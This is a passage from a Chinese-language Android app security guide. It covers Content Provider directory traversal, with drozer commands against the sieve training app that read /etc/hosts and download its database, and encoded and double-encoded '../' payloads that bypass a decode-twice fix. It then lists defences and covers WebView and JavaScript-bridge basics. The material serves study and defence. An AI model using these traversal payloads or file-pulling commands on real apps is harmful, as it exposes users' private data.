class="string">&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;</span>));</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> in.read(buffer);</span><br><span class="line">        <span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            out.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">            n = in.read(buffer);</span><br><span class="line">            Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        debugInfo(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>æ¡ˆä¾‹2ï¼šsieve.apk</strong></p>
<ul>
<li>
<p>æ£€æµ‹æ˜¯å¦æœ‰ç›®å½•éå†æ¼æ´<br>
<code>run scanner.provider.traversal -a &lt;åŒ…å&gt;</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923200141351.png" alt="image-20240923200141351"></p>
</li>
<li>
<p>è¯»å–ç³»ç»Ÿæ–‡ä»¶<br>
<code>run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923200417923.png" alt="image-20240923200417923"></p>
</li>
<li>
<p>ä¸‹è½½ç³»ç»Ÿæ–‡ä»¶<br>
<code>run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db f:/home/database.db</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240923200859074.png" alt="image-20240923200859074"></p>
</li>
</ul>
<p>æ¡ˆä¾‹3ï¼š</p>
<p><strong>ç›®æ ‡ä»£ç </strong>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line"><span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span>;</span><br><span class="line"><span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">    File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,paramUri.getLastPathSegment());</span><br><span class="line">    <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¯ä»¥ä»ç›®æ ‡ä»£ç ä¸­åˆ†æï¼Œè¿™æ®µä»£ç ä½¿ç”¨android.net.Uri.getLastPathSegment()ä»paramUriä¸­è·å–æ–‡ä»¶åï¼Œç„¶åå°†å…¶æ”¾ç½®åœ¨é¢„å®šä¹‰å¥½çš„ç›®å½•IMAGE_DIRECTORYä¸­ï¼Œå¦‚æœè¯¥URLæ˜¯encodedç¼–ç åçš„ï¼Œé‚£ä¹ˆå°†å¯èƒ½å¯¼è‡´ç›®å½•éå†æ¼æ´</p>
<p>Android4.3å¼€å§‹ï¼ŒUri.getLastPathSegment()å†…éƒ¨å®ç°è°ƒç”¨Uri.getPathSegments()</p>
<p>Uri.getPathSegmentsé¦–å…ˆä¼šé€šè¿‡getEncoded()è·å–ä¸€ä¸ªè·¯å¾„ï¼Œç„¶åä»¥â€/â€œä¸ºåˆ†éš”ç¬¦å°†pathåˆ†æˆç‰‡æ®µï¼Œæœ€åè°ƒç”¨decode()æ–¹æ³•è§£ç </p>
<p>å‡å¦‚æˆ‘ä»¬ä¼ é€’encodedç¼–ç åçš„urlç»™getLastPathSegment()ï¼Œç¼–ç åçš„åˆ†éš”ç¬¦å°±å˜æˆäº†%2F,ç»•è¿‡äº†å†…éƒ¨çš„åˆ†å‰²è§„åˆ™ï¼Œé‚£ä¹ˆè¿”å›çš„å°±å¯èƒ½ä¸æ˜¯çœŸæ­£æƒ³è¦çš„æ–‡ä»¶äº†ã€‚è¿™æ˜¯APIè®¾è®¡æ–¹é¢çš„é—®é¢˜ï¼Œç›´æ¥å¯¼è‡´äº†ç›®å½•éå†æ¼æ´</p>
<p>ä¸ºäº†é¿å…è¿™ç§æƒ…å†µå¯¼è‡´çš„ç›®å½•éå†æ¼æ´ï¼Œå¼€å‘è€…åº”è¯¥åœ¨ä¼ é€’ç»™getLastPathSegment()ä¹‹å‰è§£ç ï¼Œé‡‡ç”¨è°ƒç”¨ä¸¤æ¬¡getLastPathSegment()æ–¹æ³•çš„æ–¹å¼ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨æ˜¯ä¸ºäº†è§£ç ï¼Œç¬¬äºŒæ¬¡è°ƒç”¨æœŸæœ›å¾—åˆ°æ­£ç¡®çš„å€¼</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String IMAGE_DIRECTORY=localFile.getAbsolutePath();</span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri paramUri,String paramString)</span> <span class="keyword">throws</span> FileNotFoundException&#123;</span><br><span class="line">        File file=<span class="keyword">new</span> <span class="title class_">File</span>(IMAGE_DIRECTORY,Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE_READ_ONLY);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">è¿™ä¸ªç¼–ç åçš„URLï¼š ..%<span class="number">2F</span>..%<span class="number">2F</span>..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml  </span><br><span class="line">ç¬¬ä¸€æ¬¡è°ƒç”¨getLastPathSegment()ï¼Œä¼šè¿”å›../../../data/data/com.example.android.app/shared_prefs/Example.xmlã€‚  </span><br><span class="line">ç¬¬äºŒæ¬¡è°ƒç”¨getLastPathSegment()ä¼šè¿”å›Example.xml </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ç„¶è€Œæ”»å‡»è€…å¯ä»¥é‡‡ç”¨ä¸€ç§å«åš<span class="string">&quot;Double Encoding&quot;</span>çš„æŠ€æœ¯ï¼Œä½¿å¾—ç¬¬ä¸€æ¬¡è°ƒç”¨getLastPathSegment()åæ— æ³•è§£ç ã€‚</span><br><span class="line"> </span><br><span class="line">æ¯”å¦‚ä¸‹é¢ç»è¿‡<span class="type">double</span> encodedåçš„stringå°±å¯ä»¥ç»•è¿‡ä¸Šé¢è¿™ç§é˜²å¾¡</span><br><span class="line"> </span><br><span class="line">%252E%252E%<span class="number">252F</span>%252E%252E%<span class="number">252F</span>%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared_prefs%252FExample.xml</span><br><span class="line"> </span><br><span class="line">ç¬¬ä¸€æ¬¡è§£ç åï¼š %2E%2E%<span class="number">2F</span>%2E%2E%<span class="number">2F</span>%2E%2E%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared_prefs%2FExample.xml</span><br><span class="line"> </span><br><span class="line">ç¬¬äºŒæ¬¡è§£ç åï¼š ../../../data/data/com.example.android.app/shared_prefs/Example.xml</span><br><span class="line">ä»ä¼šå¯¼è‡´ç›®å½•éå†ã€‚æ‰€ä»¥ç®€å•çš„è§£ç åå†ä¼ äººä¹Ÿæ˜¯ä¸å¤Ÿçš„ï¼Œä»ç„¶éœ€è¦ä¸¥æ ¼æ ¡éªŒä»¥ç¡®ä¿pathæ˜¯æœŸæœ›çš„è·¯å¾„</span><br></pre></td></tr></table></figure>
<p><strong>å®‰å…¨é˜²æŠ¤</strong></p>
<ol>
<li>å°†ä¸å¿…è¦å¯¼å‡ºçš„Content Providerè®¾ç½®ä¸ºä¸å¯¼å‡º</li>
<li>å»é™¤æ²¡æœ‰å¿…è¦çš„openFile()æ¥å£</li>
<li>è¿‡æ»¤é™åˆ¶è·¨åŸŸè®¿é—®ï¼Œå¯¹è®¿é—®çš„ç›®æ ‡æ–‡ä»¶çš„è·¯å¾„è¿›è¡Œæœ‰æ•ˆåˆ¤æ–­</li>
<li>è®¾ç½®æƒé™æ¥è¿›è¡Œå†…éƒ¨åº”ç”¨é€šè¿‡Content Providerçš„æ•°æ®å…±äº«</li>
</ol>
<h2 id="Webviewæ¼æ´"><strong>Webviewæ¼æ´</strong></h2>
<h3 id="WebViewåŸºæœ¬ä½¿ç”¨">WebViewåŸºæœ¬ä½¿ç”¨</h3>
<h4 id="æ‰“å¼€ç½‘é¡µ">æ‰“å¼€ç½‘é¡µ</h4>
<p><strong>æ§ä»¶æ³¨å†Œ</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">&quot;@+id/Wind_webview&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>ä»£ç å®ç°</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å¾—æ§ä»¶</span></span><br><span class="line">       <span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview);</span><br><span class="line">       <span class="comment">//è®¿é—®ç½‘é¡µ</span></span><br><span class="line">       webView.loadUrl(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line">       <span class="comment">//ç³»ç»Ÿé»˜è®¤ä¼šé€šè¿‡æ‰‹æœºæµè§ˆå™¨æ‰“å¼€ç½‘é¡µï¼Œä¸ºäº†èƒ½å¤Ÿç›´æ¥é€šè¿‡WebViewæ˜¾ç¤ºç½‘é¡µï¼Œåˆ™å¿…é¡»è®¾ç½®</span></span><br><span class="line">       webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">               <span class="comment">//ä½¿ç”¨WebViewåŠ è½½æ˜¾ç¤ºurl</span></span><br><span class="line">               view.loadUrl(url);</span><br><span class="line">               <span class="comment">//è¿”å›true</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br></pre></td></tr></table></figure>
<p>æœ€åæˆ‘ä»¬åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ç½‘ç»œæƒé™ï¼š</p>
<p><code>&lt;uses</code>-<code>permission android:name</code>=<code>&quot;android.permission.INTERNET&quot;` `/</code>&gt;</p>
<h4 id="è¿œç¨‹åŠ è½½ã€">è¿œç¨‹åŠ è½½ã€</h4>
<p>jsè°ƒç”¨Android</p>
<p>åœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªjsæ–‡ä»¶,å‘½åattack.html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//ç”±äºå¯¹è±¡æ˜ å°„ï¼Œæ‰€ä»¥è°ƒç”¨testå¯¹è±¡ç­‰äºè°ƒç”¨Androidæ˜ å°„çš„å¯¹è±¡</span></span></span><br><span class="line"><span class="language-javascript">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">         &#125;</span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--ç‚¹å‡»æŒ‰é’®åˆ™è°ƒç”¨callAndroidå‡½æ•°--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Internet Click connect<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¼€å¯ä¸€ä¸ªhttp_serverç›‘å¬</p>
<p><code>python -m http.server 8080</code></p>
<p>ç¼–å†™javaä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">// è®¾ç½®ä¸Jsäº¤äº’çš„æƒé™</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// é€šè¿‡addJavascriptInterface()å°†Javaå¯¹è±¡æ˜ å°„åˆ°JSå¯¹è±¡</span></span><br><span class="line"><span class="comment">//å‚æ•°1ï¼šJavascriptå¯¹è±¡å</span></span><br><span class="line"><span class="comment">//å‚æ•°2ï¼šJavaå¯¹è±¡å</span></span><br><span class="line">mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJSç±»å¯¹è±¡æ˜ å°„åˆ°jsçš„testå¯¹è±¡</span></span><br><span class="line"><span class="comment">//loadData(String data, String mimeType, String encoding)</span></span><br><span class="line">mWebView.loadData(<span class="string">&quot;&quot;</span>,<span class="string">&quot;text/html&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// åŠ è½½JSä»£ç </span></span><br><span class="line"><span class="comment">// æ ¼å¼è§„å®šä¸º:file:///android_asset/æ–‡ä»¶å.html</span></span><br><span class="line"><span class="comment">// mWebView.loadUrl(&quot;file:///android_asset/javascript.html&quot;);</span></span><br><span class="line">mWebView.loadUrl(<span class="string">&quot;http://ipåœ°å€å¡«è‡ªå·±çš„/attack.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æä¾›æ¥å£åœ¨Webviewä¸­ä¾›JSè°ƒç”¨</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰JSéœ€è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œè¢«JSè°ƒç”¨çš„æ–¹æ³•å¿…é¡»åŠ å…¥@JavascriptInterfaceæ³¨è§£</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Helloï¼Œ&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="å¸¸ç”¨ç±»ä½¿ç”¨">å¸¸ç”¨ç±»ä½¿ç”¨</h4>
<h5 id="WebSettings"><strong>WebSettings</strong></h5>
<p>ä½œç”¨ï¼šå¯¹WebViewè¿›è¡Œé…ç½®å’Œç®¡ç†</p>
<p>é…ç½®æ­¥éª¤ï¼š</p>
<p>ç¬¬ä¸€æ­¥ï¼šæ·»åŠ è®¿é—®ç½‘ç»œæƒé™ï¼ˆAndroidManifest.xmlï¼‰</p>
<p><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;</code></p>
<p>æ³¨æ„ï¼šä»Android 9.0ï¼ˆAPIçº§åˆ«28ï¼‰å¼€å§‹ï¼Œé»˜è®¤æƒ…å†µä¸‹ç¦ç”¨æ˜æ–‡æ”¯æŒï¼Œä¼šæ˜¾ç¤º <code>ERR_CLEARTEXT_NOT_PERMITTED</code>ã€‚å› æ­¤httpçš„urlå‡æ— æ³•åœ¨webviewä¸­åŠ è½½ï¼Œå¯ä»¥åœ¨manifestä¸­applicationèŠ‚ç‚¹æ·»åŠ <code>android:usesCleartextTraffic=&quot;true&quot;</code>ã€‚</p>
<p>ç¬¬äºŒæ­¥ï¼šç”Ÿæˆä¸€ä¸ªWebViewç»„ä»¶ï¼ˆæœ‰ä¸¤ç§æ–¹å¼ï¼‰</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ–¹å¼1ï¼šç›´æ¥åœ¨åœ¨Activityä¸­ç”Ÿæˆ</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebView</span>(<span class="built_in">this</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ–¹æ³•2ï¼šåœ¨Activityçš„layoutæ–‡ä»¶é‡Œæ·»åŠ webviewæ§ä»¶ï¼š</span></span><br><span class="line"><span class="type">WebView</span> <span class="variable">webview</span> <span class="operator">=</span> (WebView) findViewById(R.id.webView1);</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸‰æ­¥ï¼šè¿›è¡Œé…ç½®-åˆ©ç”¨WebSettingså­ç±»ï¼ˆå¸¸è§æ–¹æ³•ï¼‰</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å£°æ˜WebSettingså­ç±»</span></span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> webView.getSettings();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å¦‚æœè®¿é—®çš„é¡µé¢ä¸­è¦ä¸Javascriptäº¤äº’ï¼Œåˆ™webviewå¿…é¡»è®¾ç½®æ”¯æŒJavascript</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ”¯æŒæ’ä»¶</span></span><br><span class="line">webSettings.setPluginsEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å…³é—­webviewä¸­ç¼“å­˜</span></span><br><span class="line">webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); </span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®å¯ä»¥è®¿é—®æ–‡ä»¶</span></span><br><span class="line">webSettings.setAllowFileAccess(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p>å¸¸è§æ–¹æ³•ï¼šè®¾ç½®WebViewç¼“å­˜</p>
<ul>
<li>å½“åŠ è½½ html é¡µé¢æ—¶ï¼ŒWebViewä¼šåœ¨/data/data/åŒ…åç›®å½•ä¸‹ç”Ÿæˆ database ä¸ cache ä¸¤ä¸ªæ–‡ä»¶å¤¹</li>
<li>è¯·æ±‚çš„ URLè®°å½•ä¿å­˜åœ¨ WebViewCache.dbï¼Œè€Œ URLçš„å†…å®¹æ˜¯ä¿å­˜åœ¨ WebViewCache æ–‡ä»¶å¤¹ä¸‹</li>
</ul>
<h5 id="WebViewClientç±»"><strong>WebViewClientç±»</strong></h5>
<p>ä½œç”¨ï¼šç”¨æ¥å¤„ç†å„ç§é€šçŸ¥ &amp; è¯·æ±‚äº‹ä»¶</p>
<p><strong>shouldOverrideUrlLoading()</strong></p>
<p>ä½œç”¨ï¼šæ‰“å¼€ç½‘é¡µæ—¶ä¸è°ƒç”¨ç³»ç»Ÿæµè§ˆå™¨ï¼Œ è€Œæ˜¯åœ¨æœ¬WebViewä¸­æ˜¾ç¤ºï¼›åœ¨ç½‘é¡µä¸Šçš„æ‰€æœ‰åŠ è½½éƒ½ç»è¿‡è¿™ä¸ªæ–¹æ³•,è¿™ä¸ªå‡½æ•°æˆ‘ä»¬å¯ä»¥åšå¾ˆå¤šæ“ä½œã€‚</p>
<h4 id="webviewä¸jsåŠ æŠ¤">webviewä¸jsåŠ æŠ¤</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_F97H8PAK73A38RC.png" alt="image-20220726171737615"></p>
<h5 id="Androidè°ƒç”¨JS">Androidè°ƒç”¨JS</h5>
<p>å‡†å¤‡jsæ–‡ä»¶ï¼Œæ”¾åˆ°assetsä¸­</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>æµ‹è¯•<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">callJS</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;Androidè°ƒç”¨äº†JSçš„callJSæ–¹æ³•&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Androidè°ƒç”¨JSæ–¹æ³•æµ‹è¯•<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶ååœ¨Javaå±‚ä¸­æ·»åŠ ä»£ç ï¼Œè¿›è¡Œè°ƒç”¨JSæ–‡ä»¶ä»¥åŠJSä¸­çš„æ–¹æ³•ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®ä¸Jsäº¤äº’çš„æƒé™</span></span><br><span class="line"> webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> <span class="comment">// è®¾ç½®å…è®¸JSå¼¹çª—</span></span><br><span class="line"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// å…ˆè½½å…¥JSä»£ç </span></span><br><span class="line"> <span class="comment">// æ ¼å¼è§„å®šä¸º:file:///android_asset/æ–‡ä»¶å.html</span></span><br><span class="line"> mWebView.loadUrl(<span class="string">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line"> button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span 